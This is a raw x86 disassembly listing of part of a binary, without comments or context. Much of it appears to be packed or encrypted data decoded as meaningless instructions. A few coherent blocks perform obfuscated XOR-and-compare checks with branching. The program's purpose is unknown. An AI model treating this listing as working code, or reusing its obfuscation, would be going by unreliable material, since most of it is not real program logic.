  4018e3:	adc    BYTE PTR [edx],ah
  4018e5:	fnstsw WORD PTR [edi-0x2f]
  4018e8:	fnsave [ecx]
  4018ea:	adc    al,0x55
  4018ec:	sahf   
  4018ed:	test   BYTE PTR ds:0xf8936d7c,ah
  4018f3:	mov    esi,eax
  4018f5:	mov    esi,0x895d6474
  4018fa:	in     al,dx
  4018fb:	fdivrp st(7),st
  4018fd:	adc    al,0x2e
  4018ff:	inc    ecx
  401900:	aad    0xa
  401902:	loopne 0x401899
  401904:	sahf   
  401905:	or     BYTE PTR [esi+0x5762a0a5],ch
  40190b:	inc    eax
  40190c:	fwait
  40190d:	test   ecx,esp
  40190f:	jne    0x401930
  401911:	adc    al,0xd3
  401913:	sbb    DWORD PTR [edx],edi
  401915:	stos   BYTE PTR es:[edi],al
  401916:	adc    BYTE PTR [ebx],ah
  401918:	clc    
  401919:	inc    edx
  40191a:	jmp    0x1082:0x630ca368
  401921:	aam    0xee
  401923:	xchg   ebx,eax
  401924:	je     0x4018f2
  401926:	fcomi  st,st(5)
  401928:	test   al,0x92
  40192a:	imul   edx,DWORD PTR [ebx+ebx*4],0xd
  40192e:	pop    es
  40192f:	adc    edx,ebx
  401931:	and    BYTE PTR [edx],bl
  401933:	pop    eax
  401934:	push   0x3794e942
  401939:	xor    esi,esp
  40193b:	push   esp
  40193c:	fst    QWORD PTR [edi+0x3b92b60d]
  401942:	dec    edx
  401943:	xchg   edi,eax
  401944:	mov    bl,0xaf
  401946:	pop    ecx
  401947:	xlat   BYTE PTR ds:[ebx]
  401948:	dec    esi
  401949:	jnp    0x4018d3
  40194b:	dec    ebp
  40194c:	mov    DWORD PTR [ebp-0x1c],eax
  40194f:	mov    eax,DWORD PTR [ebp-0x1c]
  401952:	mov    DWORD PTR [eax],0xf89f2da9
  401958:	mov    eax,DWORD PTR [ebp-0x14]
  40195b:	mov    ebx,DWORD PTR [ebp-0x8]
  40195e:	xor    eax,ecx
  401960:	xor    ebx,ecx
  401962:	xor    edx,edx
  401964:	add    eax,esi
  401966:	add    ebx,esi
  401968:	div    ebx
  40196a:	mov    edx,DWORD PTR [ebp-0x2c]
  40196d:	cmp    eax,DWORD PTR [edx]
  40196f:	je     0x40271e
  401975:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40197c:	lea    eax,[ebp-0xc]
  40197f:	mov    DWORD PTR [ebp-0x10],eax
  401982:	jmp    0x401b9f
  401987:	int3   
  401988:	sub    eax,0xbde9be20
  40198d:	push   0xffffffa9
  40198f:	mov    ebp,0xb27bf628
  401994:	mov    bh,0x27
  401996:	xchg   edx,eax
  401997:	jo     0x401a13
  401999:	jo     0x401a0b
  40199b:	jo     0x401a1b
  40199d:	jo     0x401a0f
  40199f:	pop    es
  4019a0:	cmp    eax,0xb0911c53
  4019a5:	(bad)  
  4019a6:	pop    ebp
  4019a7:	arpl   dx,dx
  4019a9:	int3   
  4019aa:	cmp    eax,0x86cdbf40
  4019af:	ins    DWORD PTR es:[edi],dx
  4019b0:	fsub   st,st(6)
  4019b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019b3:	repz dec eax
  4019b5:	in     al,dx
  4019b6:	arpl   dx,dx
  4019b8:	aam    0x47
  4019ba:	jmp    FWORD PTR [ebx-0x62]
  4019bd:	push   ebp
  4019be:	in     eax,0x93
  4019c0:	out    dx,eax
  4019c1:	cmp    ah,BYTE PTR [ecx+eax*2-0x1e38715d]
  4019c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019c9:	test   al,0x28
  4019cb:	inc    ecx
  4019cc:	loop   0x4019c1
  4019ce:	repz pop edx
  4019d0:	shr    ebp,cl
  4019d2:	mov    WORD PTR [ebx+0x49],?
  4019d5:	fidiv  DWORD PTR [ebp-0x70]
  4019d8:	into   
  4019d9:	xor    DWORD PTR [eax+0x77],esp
  4019dc:	shr    BYTE PTR [esi+0x16],1
  4019df:	jp     0x401a0e
  4019e1:	pusha  
  4019e2:	rcl    DWORD PTR [eax],0xa3
  4019e5:	test   bl,dh
  4019e7:	push   ebx
  4019e8:	xchg   ecx,eax
  4019e9:	loopne 0x4019ab
  4019eb:	mov    dh,0x48
  4019ed:	cld    
  4019ee:	dec    edi
  4019ef:	call   0x93c3:0x3092af74
  4019f6:	bound  esi,QWORD PTR [edx+0x5d]
  4019f9:	adc    ecx,DWORD PTR [eax]
  4019fb:	cs mov esp,?
  4019fe:	(bad)  
  4019ff:	mov    esi,edi
  401a01:	dec    esi
  401a02:	mov    al,0x8
  401a04:	cmp    DWORD PTR [esi],eax
  401a06:	shl    cl,1
  401a08:	aam    0xfd
  401a0a:	pop    edi
  401a0b:	or     al,0x12
  401a0d:	test   edx,ebx
  401a0f:	inc    ebx
  401a10:	shl    esp,cl
  401a12:	ins    BYTE PTR es:[edi],dx
  401a13:	aas    
  401a14:	and    BYTE PTR [eax+edx*1],cl
  401a17:	jmp    0xdce06203
  401a1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a1d:	add    ebx,DWORD PTR [eax]
  401a1f:	adc    eax,0x3ce47e60
  401a24:	fstp   TBYTE PTR [ebx]
  401a26:	cmp    edi,ecx
  401a28:	outs   dx,BYTE PTR ds:[esi]
  401a29:	clc    
  401a2a:	mov    ebp,0x36e1aed5
  401a2f:	pop    eax
  401a30:	call   0x213d930c
  401a35:	sbb    BYTE PTR [ecx+0x410a4994],al
  401a3b:	or     ecx,DWORD PTR [esp+ebx*4-0xc]
  401a3f:	push   ebp
  401a40:	sahf   
  401a41:	pop    ss
  401a42:	stc    
  401a43:	ins    BYTE PTR es:[edi],dx
  401a44:	ja     0x401a10
  401a46:	cmp    DWORD PTR [ebx+0x213a232b],ecx
  401a4c:	inc    ebx
  401a4d:	(bad)  
  401a4e:	pop    ecx
  401a4f:	pusha  
  401a50:	call   0x1bfd7d17
  401a55:	outs   dx,DWORD PTR ds:[esi]
  401a56:	popa   
  401a57:	(bad)  
  401a58:	push   edi
  401a59:	adc    al,0xf5
  401a5b:	or     ebx,eax
  401a5d:	mov    ah,0x65
  401a5f:	jecxz  0x401ab6
  401a61:	or     eax,0x29561afd
  401a66:	in     eax,0x6c
  401a68:	in     eax,0x42
  401a6a:	in     eax,0x67
  401a6c:	mov    ch,0xc3
  401a6e:	test   ebp,edi
  401a70:	pop    eax
  401a71:	outs   dx,DWORD PTR ds:[esi]
  401a72:	addr16 test edx,ebx
  401a75:	jno    0x401ab3
  401a77:	(bad)  
  401a78:	mov    ah,0xe7
  401a7a:	call   0x335b:0x3e2ad5cf
  401a81:	xchg   ebx,eax
  401a82:	jns    0x401a1b
  401a84:	pop    ebp
  401a85:	jne    0x401a94
  401a87:	add    eax,0x9cbce4a
  401a8c:	loop   0x401a94
  401a8e:	push   0xc986310d
  401a93:	inc    esi
  401a94:	nop
  401a95:	punpcklwd mm1,DWORD PTR [eax]
  401a98:	test   al,0xc1
  401a9a:	data16 fwait
  401a9c:	push   cs
  401a9d:	dec    edx
  401a9e:	fistp  WORD PTR [esi+0x1]
  401aa1:	ins    BYTE PTR es:[edi],dx
  401aa2:	sti    
  401aa3:	push   esi
  401aa4:	sbb    al,0x9f
  401aa6:	ins    BYTE PTR es:[edi],dx
  401aa7:	outs   dx,BYTE PTR ds:[esi]
  401aa8:	in     eax,dx
  401aa9:	jmp    0xbf8c:0xf1a47050
  401ab0:	inc    ecx
  401ab1:	cmc    
  401ab2:	sar    DWORD PTR [eax],cl
  401ab4:	loopne 0x401a6a
  401ab6:	jns    0x401a8e
  401ab8:	inc    edx
  401ab9:	sbb    al,0x33
  401abb:	xor    al,0x6b
  401abd:	jmp    0x1b3e7091
  401ac2:	xor    DWORD PTR [edi-0x27],ebp
  401ac5:	addr16 retf 
  401ac7:	in     al,dx
  401ac8:	add    ebp,DWORD PTR [eax+0x60]
  401acb:	nop
  401acc:	add    BYTE PTR [ecx+0x9105142],0x58
  401ad3:	lahf   
  401ad4:	sbb    al,0x7e
  401ad6:	jmp    0x548480b0
  401adb:	mov    dl,0x63
  401add:	push   0x924ef4e0
  401ae2:	andnps xmm3,xmm7
  401ae5:	pop    edi
  401ae6:	jbe    0x401b4e
  401ae8:	aas    
  401ae9:	jp     0x401b0a
  401aeb:	mov    cl,0x26
  401aed:	out    0x45,eax
  401aef:	pop    ss
  401af0:	push   cs
  401af1:	jg     0x401ab8
  401af3:	imul   ecx,DWORD PTR [ebx-0xcc099b5],0xf3c0e6fc
  401afd:	mov    ah,0x7b
  401aff:	push   eax
  401b00:	cmp    al,BYTE PTR [ebp-0x57]
  401b03:	imul   edi,DWORD PTR [ebx],0xfffffffa
  401b06:	xor    al,BYTE PTR [esi]
  401b08:	cmp    DWORD PTR [ecx-0x71c2cdcd],edi
  401b0e:	lahf   
  401b0f:	push   ecx
  401b10:	fcomp  QWORD PTR [ecx]
  401b12:	mov    edx,0xed87c1ac
  401b17:	jo     0x401add
  401b19:	sub    dl,BYTE PTR [esi-0x39]
  401b1c:	pushf  
  401b1d:	jmp    0xea0d:0xac49dd1a
  401b24:	inc    edx
  401b25:	cmp    BYTE PTR [ebx+0x78f0606a],ch
  401b2b:	mov    esi,0x6d94f8e9
  401b30:	push   0xffffffae
  401b32:	scas   al,BYTE PTR es:[edi]
  401b33:	sahf   
  401b34:	ret    
  401b35:	or     ebx,DWORD PTR ss:[ecx+ebp*4+0x5e]
  401b3a:	cmp    eax,eax
  401b3c:	fcomp  st(0)
  401b3e:	pop    ebp
  401b3f:	dec    BYTE PTR [ebp+esi*8-0x5e]
  401b43:	mov    ebx,0x1cb2a32
  401b48:	std    
  401b49:	call   DWORD PTR [ecx-0x37]
  401b4c:	gs leave 
  401b4e:	lods   al,BYTE PTR ds:[esi]
  401b4f:	mov    esi,0x18597ce5
  401b54:	nop
  401b55:	lock sub al,0x30
  401b58:	loopne 0x401add
  401b5a:	xchg   esi,eax
  401b5b:	jae    0x401b31
  401b5d:	push   edi
  401b5e:	ds jnp 0x401bd0
  401b61:	sar    DWORD PTR [edi+0x1dc66145],1
  401b67:	adc    DWORD PTR [ecx+0x48],eax
  401b6a:	int    0x76
  401b6c:	or     al,0x8d
  401b6e:	ffree  st(7)
  401b70:	(bad)  
  401b71:	imul   DWORD PTR [edi-0x554afb6e]
  401b77:	rol    DWORD PTR [edx+edi*8+0x3],0x41
  401b7c:	pop    edi
  401b7d:	and    edx,DWORD PTR [ebx-0x114f39f3]
  401b83:	sbb    eax,0x10e856c7
  401b88:	fstp   QWORD PTR [ebp+0x3ad08744]
  401b8e:	jne    0x401b57
  401b90:	ret    0x44d
  401b93:	fild   DWORD PTR [ecx+ebp*2]
  401b96:	jmp    0x6f4a:0x4bae0abf
  401b9d:	(bad)  
  401b9e:	bound  ecx,QWORD PTR [ebx+0x108bf045]
  401ba4:	imul   edx,edx,0xf89ea9ec
  401baa:	mov    DWORD PTR [eax],edx
  401bac:	mov    eax,DWORD PTR [ebp-0xc]
  401baf:	cmp    eax,0x742b26d4
  401bb4:	je     0x401bc8
  401bba:	mov    eax,DWORD PTR [ebp-0x1c]
  401bbd:	or     DWORD PTR [eax],0x60751c9c
  401bc3:	jmp    0x40272d
  401bc8:	mov    eax,DWORD PTR [ebp-0xc]
  401bcb:	jmp    0x401de8
  401bd0:	popa   
  401bd1:	ja     0x401bca
  401bd3:	add    esi,ecx
  401bd5:	xor    DWORD PTR [ecx+0x75],0xffffffde
  401bd9:	adc    al,0xb4
  401bdb:	mov    dh,BYTE PTR [esi+eax*8]
  401bde:	pusha  
  401bdf:	add    eax,0x70707870
  401be4:	jo     0x401c64
  401be6:	jo     0x401c58
  401be8:	cwde   
  401be9:	jne    0x401bae
  401beb:	arpl   WORD PTR [ebp-0x8d5cf07],bp
  401bf1:	clc    
  401bf2:	mov    esp,0xb269fc4e
  401bf7:	add    dh,BYTE PTR [ebx+0x71aed25f]
  401bfd:	and    ecx,DWORD PTR ds:0xeca73047
  401c03:	adc    al,0x7d
  401c05:	push   ebp
  401c06:	xchg   ah,ah
  401c08:	lods   eax,DWORD PTR ds:[esi]
  401c09:	shl    BYTE PTR [edi+esi*8],cl
  401c0c:	or     BYTE PTR [eax+0x3a80371b],al
  401c12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c13:	or     BYTE PTR [edx+0x758c40cd],bh
  401c19:	jmp    0x401c50
  401c1b:	add    BYTE PTR [eax],0xcf
  401c1e:	cld    
  401c1f:	fild   WORD PTR [edx-0x1d94b188]
  401c25:	adc    eax,0xea238e8d
  401c2a:	sbb    DWORD PTR [edi+esi*8+0x4ea48c69],0x7c0bc53f
  401c35:	mov    al,ds:0x1cd76bbe
  401c3a:	pop    ss
  401c3b:	sbb    ecx,DWORD PTR [esi]
  401c3d:	sub    cl,BYTE PTR [ebx+0x6923ac9e]
  401c43:	loopne 0x401c9c
  401c45:	jmp    0x4865:0x8dd14159
  401c4c:	push   ss
  401c4d:	jno    0x401ca8
  401c4f:	mov    al,0xb0
  401c51:	adc    al,0x55
  401c53:	iret   
  401c54:	mov    bl,0x4f
  401c56:	mov    al,0x99
  401c58:	jmp    0x4bb4bc90
  401c5d:	and    dl,BYTE PTR [ecx]
  401c5f:	dec    ebx
  401c60:	into   
  401c61:	jg     0x401cce
  401c63:	fist   DWORD PTR [edx+edx*1-0x19]
  401c67:	jl     0x401ce4
  401c69:	cmp    ecx,edi
  401c6b:	or     al,dh
  401c6d:	pop    ds
  401c6e:	dec    esp
  401c6f:	sbb    esp,DWORD PTR [edx-0x32]
  401c72:	push   edi
  401c73:	loop   0x401c3c
  401c75:	mov    BYTE PTR [ebx+0xa438b65],dh
  401c7b:	sub    DWORD PTR [ebx+esi*1],ecx
  401c7e:	add    DWORD PTR [eax],0x6d
  401c81:	mov    cl,0xe3
  401c83:	fisttp QWORD PTR [eax-0x3f0b3a7a]
  401c89:	cmp    BYTE PTR [eax-0xad4718e],al
  401c8f:	xlat   BYTE PTR ds:[ebx]
  401c90:	cs dec si
  401c93:	out    0x14,eax
  401c95:	test   al,0x4c
  401c97:	lods   eax,DWORD PTR ds:[esi]
  401c98:	test   eax,0x310f9b01
  401c9d:	gs jl  0x401c94
  401ca0:	mov    BYTE PTR [eax],al
  401ca2:	test   BYTE PTR [ecx-0x51],cl
  401ca5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ca6:	push   edi
  401ca7:	test   DWORD PTR [ebp-0x3c],edi
  401caa:	mov    bl,BYTE PTR es:[esi]
  401cad:	test   eax,0x1127e8fe
  401cb2:	scas   eax,DWORD PTR es:[edi]
  401cb3:	fnstenv [eax+edx*8+0x190c2979]
  401cba:	inc    eax
  401cbb:	and    edi,DWORD PTR [ebx+edi*2]
  401cbe:	pushf  
  401cbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cc0:	adc    BYTE PTR [esi],ch
  401cc2:	fstp   TBYTE PTR [edi+0x575459fd]
  401cc8:	dec    ebp
  401cc9:	jmp    0xc41b:0xe2fb9cbf
  401cd0:	jecxz  0x401c83
  401cd2:	stc    
  401cd3:	dec    esi
  401cd4:	jne    0x401cb0
  401cd6:	adc    al,0xc0
  401cd8:	sbb    ecx,DWORD PTR [eax-0x5b]
  401cdb:	mov    ebp,0x16c2a96d
  401ce0:	in     eax,dx
  401ce1:	cwde   
  401ce2:	shr    DWORD PTR [edi],1
  401ce4:	cmp    eax,0xa928448b
  401ce9:	jae    0x401c93
  401ceb:	sbb    dl,BYTE PTR [ecx+0x18]
  401cee:	pusha  
  401cef:	jb     0x401d4e
  401cf1:	popf   
  401cf2:	push   ecx
  401cf3:	aad    0x9b
  401cf5:	loop   0x401cc3
  401cf7:	xchg   esi,eax
  401cf8:	mov    dh,bl
  401cfa:	sub    dh,BYTE PTR [ecx+0x320168c9]
  401d00:	jp     0x401d12
  401d02:	mov    edx,0xf6137733
  401d07:	fwait
  401d08:	add    eax,0x77adedcc
  401d0d:	mov    ebp,0xd8212ad3
  401d12:	xor    BYTE PTR [edx-0x854a29f],al
  401d18:	popf   
  401d19:	push   edx
  401d1a:	fs gs clc 
  401d1d:	(bad)  
  401d1e:	jb     0x401d71
  401d20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d21:	ins    DWORD PTR es:[edi],dx
  401d22:	loopne 0x401ce9
  401d24:	jbe    0x401d13
  401d26:	sub    BYTE PTR [eax],dh
  401d28:	jg     0x401d3a
  401d2a:	scas   eax,DWORD PTR es:[edi]
  401d2b:	arpl   WORD PTR ds:0xc37d99ed,ax
  401d31:	ins    BYTE PTR es:[edi],dx
  401d32:	jo     0x401d5c
  401d34:	mov    dl,0xd3
  401d36:	mov    bh,0x86
  401d38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d39:	add    DWORD PTR [ecx+0x58ac6feb],ecx
  401d3f:	mov    edi,0xc2c7fbcc
  401d44:	cmp    al,0x58
  401d46:	or     DWORD PTR [esi],edx
  401d48:	out    dx,al
  401d49:	xor    al,0x67
  401d4b:	and    eax,0x570b99c4
  401d50:	icebp  
  401d51:	sbb    al,0x36
  401d53:	xor    eax,0xee7053e
  401d58:	popa   
  401d59:	shl    DWORD PTR [edi-0x6381b546],0xca
  401d60:	and    eax,esp
  401d62:	daa    
  401d63:	(bad)  
  401d64:	paddusb mm2,QWORD PTR [edx]
  401d67:	xchg   ebp,eax
  401d68:	jmp    0xe0805b7
  401d6d:	add    al,0x20
  401d6f:	shr    DWORD PTR [edx+0x78f0f86b],1
  401d75:	xor    eax,DWORD PTR [esi]
  401d77:	rcr    BYTE PTR [ebx+0x6fba2609],1
  401d7d:	jmp    0x401d9f
  401d7f:	icebp  
  401d80:	jp     0x401d80
  401d82:	adc    DWORD PTR [edx-0x4ba91b62],esi
  401d88:	push   cs
  401d89:	lods   eax,DWORD PTR ds:[esi]
  401d8a:	and    al,0x4c
  401d8c:	adc    ah,BYTE PTR [edi]
  401d8e:	sahf   
  401d8f:	sub    eax,DWORD PTR [esp+edx*1]
  401d92:	fldcw  WORD PTR [ebp+0x26]
  401d95:	int    0xf2
  401d97:	retf   0x9293
  401d9a:	push   ebp
  401d9b:	shr    DWORD PTR cs:[esp+edi*8],cl
  401d9f:	mov    esp,0xd06928b8
  401da4:	data16 sti 
  401da6:	cmp    eax,0x94bae0c8
  401dab:	sbb    ah,BYTE PTR [ebx+0x22a6f839]
  401db1:	push   ecx
  401db2:	aas    
  401db3:	jp     0x401dd5
  401db5:	in     al,dx
  401db6:	in     eax,0xd1
  401db8:	pop    esp
  401db9:	in     eax,dx
  401dba:	je     0x401dee
  401dbc:	les    ebp,FWORD PTR [ebx-0x5712f8ee]
  401dc2:	ds jmp 0xc131:0x6ae5dc0
  401dca:	test   eax,0x1d0935e9
  401dcf:	fistp  DWORD PTR [edi+0x2ac0bba4]
  401dd5:	mov    bh,0xaa
  401dd7:	rcr    cl,0xa2
  401dda:	push   esi
  401ddb:	dec    ecx
  401ddc:	push   ss
  401ddd:	neg    DWORD PTR [edx-0x39]
  401de0:	dec    ecx
  401de1:	les    ebx,FWORD PTR [ebp-0x2]
  401de4:	mov    bl,0x3d
  401de6:	jbe    0x401e18
  401de8:	add    eax,DWORD PTR [ebp-0x18]
  401deb:	cmp    eax,0x6cca547d
  401df0:	je     0x401e04
  401df6:	mov    eax,DWORD PTR [ebp-0x10]
  401df9:	and    DWORD PTR [eax],0x751c99
  401dff:	jmp    0x40272d
  401e04:	mov    eax,DWORD PTR [ebp-0xc]
  401e07:	mov    edx,DWORD PTR [ebp-0x18]
  401e0a:	or     eax,edx
  401e0c:	cmp    eax,0xfcbf2ffd
  401e11:	je     0x401e25
  401e17:	mov    eax,DWORD PTR [ebp-0x10]
  401e1a:	xor    DWORD PTR [eax],0x2650fa8f
  401e20:	jmp    0x40272d
  401e25:	mov    ax,WORD PTR [ebp-0x4]
  401e29:	mov    edx,0x8a3e
  401e2e:	xor    ax,dx
  401e31:	jmp    0x40204e
  401e36:	cld    
  401e37:	test   BYTE PTR [edx+0x3d],ch
  401e3a:	jb     0x401e31
  401e3c:	stos   DWORD PTR es:[edi],eax
  401e3d:	inc    ecx
  401e3e:	inc    eax
  401e3f:	(bad)  
  401e40:	cmp    BYTE PTR [esp+esi*8-0xe],dl
  401e44:	sub    DWORD PTR [bx+si+0x6],esi
  401e48:	jo     0x401eba
  401e4a:	jo     0x401eca
  401e4c:	jo     0x401ebe
  401e4e:	add    al,0x10
  401e50:	sub    dh,al
  401e52:	clc    
  401e53:	push   ebp
  401e54:	add    bh,BYTE PTR [ebx+0x5b]
  401e57:	in     eax,dx
  401e58:	(bad)  
  401e59:	jbe    0x401e53
  401e5b:	ficomp DWORD PTR [ebx+edi*2+0x55e9762f]
  401e62:	push   0xffffffa3
  401e64:	inc    ebx
  401e65:	inc    ebx
  401e66:	mov    cl,0xb2
  401e68:	xchg   ebx,eax
  401e69:	out    dx,al
  401e6a:	mov    dh,0x33
  401e6c:	push   ebx
  401e6d:	xchg   esi,ebp
  401e6f:	sub    ah,BYTE PTR [esi+0x41]
  401e72:	mov    cs,WORD PTR [edi-0x6a1313ce]
  401e78:	and    DWORD PTR [esp+edi*8-0x40],eax
  401e7c:	dec    ebp
  401e7d:	popa   
  401e7e:	call   0xc520:0xe0c0e33b
  401e85:	call   DWORD PTR [edx-0x7e]
  401e88:	fs pop ds
  401e8a:	dec    eax
  401e8b:	push   ecx
  401e8c:	in     al,0x7a
  401e8e:	sbb    al,0xbd
  401e90:	cmp    eax,0x28684deb
  401e95:	xchg   edx,eax
  401e96:	outs   dx,BYTE PTR ds:[esi]
  401e97:	in     eax,dx
  401e98:	fisubr WORD PTR [eax+0x6a]
  401e9b:	cmp    esi,ebx
  401e9d:	add    dh,BYTE PTR [edx]
  401e9f:	outs   dx,BYTE PTR ds:[esi]
  401ea0:	push   0xfffffffa
  401ea2:	xchg   DWORD PTR [ecx-0x5a8c8d8c],eax
  401ea8:	sbb    bl,bl
  401eaa:	jmp    0x401edb
  401eac:	xchg   ecx,eax
  401ead:	inc    esp
  401eae:	mov    eax,ds:0xb046eca4
  401eb3:	mov    al,ds:0x357eb77e
  401eb8:	lods   al,BYTE PTR ds:[esi]
  401eb9:	mov    bh,0x3b
  401ebb:	in     eax,0x38
  401ebd:	dec    esi
  401ebe:	mov    edx,DWORD PTR ss:[ecx]
  401ec1:	adc    eax,0x56aa61c9
  401ec6:	mov    DWORD PTR [ebx+0x57e0670a],0x3a82468c
  401ed0:	fistp  DWORD PTR [ebx]
  401ed2:	and    eax,0x2ff055a5
  401ed7:	cmp    DWORD PTR [eax-0x2a],ecx
  401eda:	or     al,0xd
  401edc:	fild   QWORD PTR [eax]
  401ede:	cmp    al,BYTE PTR [eax]
  401ee0:	call   FWORD PTR [ebx+0x70192094]
  401ee6:	mov    edx,0x9b01b410
  401eeb:	stos   BYTE PTR es:[edi],al
  401eec:	loopne 0x401e9f
  401eee:	dec    edx
  401eef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ef0:	add    dh,BYTE PTR [ebp-0x32766ac7]
  401ef6:	mov    ecx,0x20fd3482
  401efb:	and    BYTE PTR [edx],bh
  401efd:	xlat   BYTE PTR ds:[ebx]
  401efe:	sbb    bh,BYTE PTR [esi-0x5f6764fa]
  401f04:	call   0x8409:0xbd752f6f
  401f0b:	int    0x42
  401f0d:	sbb    al,0x24
  401f0f:	int    0x52
  401f11:	aas    
  401f12:	loope  0x401ed5
  401f14:	cmp    ebx,DWORD PTR [ebp-0x31]
  401f17:	add    dl,BYTE PTR [eax-0x72]
  401f1a:	ret    0xadc9
  401f1d:	addr16 repz push esi
  401f20:	inc    ebp
  401f21:	xchg   ecx,eax
  401f22:	xor    DWORD PTR [esp+eax*1-0x3d],ebp
  401f26:	pop    esi
  401f27:	adc    al,0x5f
  401f29:	jb     0x401ed2
  401f2b:	dec    edx
  401f2c:	pop    ss
  401f2d:	xchg   esp,eax
  401f2e:	jne    0x401fa8
  401f30:	scas   al,BYTE PTR es:[edi]
  401f31:	loopne 0x401f2f
  401f33:	aaa    
  401f34:	loope  0x401fb0
  401f36:	inc    ecx
  401f37:	sbb    BYTE PTR [ebx-0x3e],0x11
  401f3b:	lahf   
  401f3c:	gs fwait
  401f3e:	je     0x401f92
  401f40:	shl    BYTE PTR [edx+0x7e3b0bd3],cl
  401f46:	mov    ch,0x7b
  401f48:	imul   edi,esp,0xffffffd0
  401f4b:	cmp    eax,0xa221bb52
  401f50:	fucomip st,st(1)
  401f52:	sbb    edx,0xffffffcc
  401f55:	(bad)  
  401f56:	adc    cl,BYTE PTR [eax+0x19]
  401f59:	stc    
  401f5a:	sbb    eax,edx
  401f5c:	mov    cl,ah
  401f5e:	push   0x66cde80d
  401f63:	imul   esi,esi,0x73e1fa16
  401f69:	es mov edx,0xc4c1b3ad
  401f6f:	js     0x401fcf
  401f71:	pop    esp
  401f72:	fnstsw WORD PTR [ebx+0x33]
  401f75:	mov    al,0x4a
  401f77:	test   ch,0x87
  401f7a:	clc    
  401f7b:	ret    0x9d83
  401f7e:	and    eax,0x47fd208f
  401f83:	sahf   
  401f84:	inc    edx
  401f85:	je     0x401f94
  401f87:	imul   ebp
  401f89:	ja     0x401f96
  401f8b:	and    eax,0x44dc0c9f
  401f90:	mov    ah,0xfb
  401f92:	inc    ecx
  401f93:	cmp    eax,0xee85236b
  401f99:	(bad)  
  401f9b:	mov    ecx,0xa6a16b50
  401fa0:	push   0x41
  401fa2:	adc    BYTE PTR [esi+0x1814a7b4],ah
  401fa8:	sbb    DWORD PTR [edi],ebx
  401faa:	loop   0x401f63
  401fac:	inc    esi
  401fad:	inc    edi
  401fae:	and    al,BYTE PTR [esp+eiz*8+0x3b]
  401fb2:	cmp    eax,edx
  401fb4:	push   edi
  401fb5:	daa    
  401fb6:	push   es
  401fb7:	adc    bl,cl
  401fb9:	scas   al,BYTE PTR es:[edi]
  401fba:	sbb    esp,DWORD PTR [esi]
  401fbc:	imul   edi,DWORD PTR [edx-0x5588f6b8],0x59
  401fc3:	hlt    
  401fc4:	hlt    
  401fc5:	dec    esi
  401fc6:	call   0xd2d:0x4a2dcb30
  401fcd:	add    ebx,DWORD PTR [ecx+0x44]
  401fd0:	xchg   BYTE PTR ds:0x84ea5752,ch
  401fd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401fd7:	stos   BYTE PTR es:[edi],al
  401fd8:	jo     0x401fd7
  401fda:	mov    ds:0x611cc7c7,al
  401fdf:	jp     0x401fdb
  401fe1:	lods   eax,DWORD PTR ds:[esi]
  401fe2:	push   ebp
  401fe3:	push   ecx
  401fe4:	call   0x79cb:0x8138e80f
  401feb:	inc    ebp
  401fec:	test   DWORD PTR [eax+0x3aafa124],ecx
  401ff2:	and    ah,BYTE PTR [eax+ecx*8-0x6859511]
  401ff9:	mov    DWORD PTR [eax+0x72106539],edx
  401fff:	pusha  
  402000:	mov    ds:0x1d1593d9,eax
  402005:	fs je  0x40203e
  402008:	dec    ecx
  402009:	pop    ss
  40200a:	aaa    
  40200b:	imul   ebx,DWORD PTR [bx-0x5d99],0x7b
  402011:	xchg   dh,bl
  402013:	adc    eax,edx
  402015:	sub    eax,DWORD PTR [ebx]
  402017:	or     ecx,DWORD PTR [ebx+0x30424ee7]
  40201d:	imul   esp,DWORD PTR [esi+0x50b787bd],0x5e
  402024:	xchg   ebp,eax
  402025:	cmp    eax,0xb3d48700
  40202a:	scas   eax,DWORD PTR es:[edi]
  40202b:	popa   
  40202c:	adc    cl,BYTE PTR [edx-0x45fc528d]
  402032:	retf   0x298b
  402035:	add    eax,0x858b605c
  40203a:	and    eax,0x896b0955
  40203f:	mov    dl,0xaa
  402041:	loope  0x401fd0
  402043:	xor    al,0x8
  402045:	cmp    eax,0x6a4d28e0
  40204a:	repz das 
  40204c:	inc    ecx
  40204d:	or     ecx,DWORD PTR [ebx+0x128bd855]
  402053:	add    ax,di
  402056:	cmp    ax,WORD PTR [edx]
  402059:	jmp    0x402276
  40205e:	ret    0x801a
  402061:	gs push 0xfb99f171
  402067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402068:	ins    BYTE PTR es:[edi],dx
  402069:	sbb    dl,0xab
  40206c:	xor    DWORD PTR [ebx+0x70],edi
  40206f:	add    al,0x70
  402071:	jo     0x4020e3
  402073:	jle    0x4020e5
  402075:	jo     0x402070
  402077:	je     0x40205c
  402079:	jp     0x402040
  40207b:	or     BYTE PTR [esi-0x72da40ce],bh
  402081:	cli    
  402082:	leave  
  402083:	sbb    DWORD PTR [ecx+eax*2-0x3d],esi
  402087:	dec    ecx
  402088:	jmp    0x402014
  40208a:	ja     0x4020fd
  40208c:	cmp    al,0xee
  40208e:	aad    0x34
  402090:	loope  0x4020e0
  402092:	mov    ecx,0x309fbee8
  402097:	push   ebp
  402098:	dec    ebx
  402099:	dec    edi
  40209a:	dec    eax
  40209b:	pop    esi
  40209c:	pusha  
  40209d:	and    esi,DWORD PTR [edx]
  40209f:	cdq    
  4020a0:	jmp    0xbd3b:0x238c397f
  4020a7:	push   0x1889ea3d
  4020ac:	inc    ebx
  4020ad:	mov    esp,0x73b916c2
  4020b2:	ret    0x24e1
  4020b5:	ja     0x4020f4
  4020b7:	push   ecx
  4020b8:	gs jb  0x40207c
  4020bb:	mov    al,ds:0xf416905b
  4020c0:	mov    edx,0x35492a3f
  4020c5:	xor    eax,0x620ecd64
  4020ca:	xchg   ebx,eax
  4020cb:	ins    BYTE PTR es:[edi],dx
  4020cc:	push   ds
  4020cd:	cmp    al,0x90
  4020cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020d0:	test   eax,0x678acfe1
